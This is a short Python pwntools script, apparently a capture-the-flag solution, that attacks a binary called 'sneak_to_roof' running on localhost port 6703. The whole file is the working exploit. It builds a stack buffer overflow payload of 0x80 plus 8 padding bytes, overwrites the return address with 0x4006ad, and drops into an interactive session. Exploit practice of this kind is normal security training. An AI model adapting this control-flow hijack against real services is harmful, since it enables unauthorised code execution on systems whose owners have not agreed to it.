from pwn import *

#r = process('./sneak_to_roof')
r = remote('localhost',6703)

payload = b'A'*0x80 + b'A'*8 + p64(0x00000000004006ad);
r.sendline("dummy")
r.sendline(payload)
r.interactive()
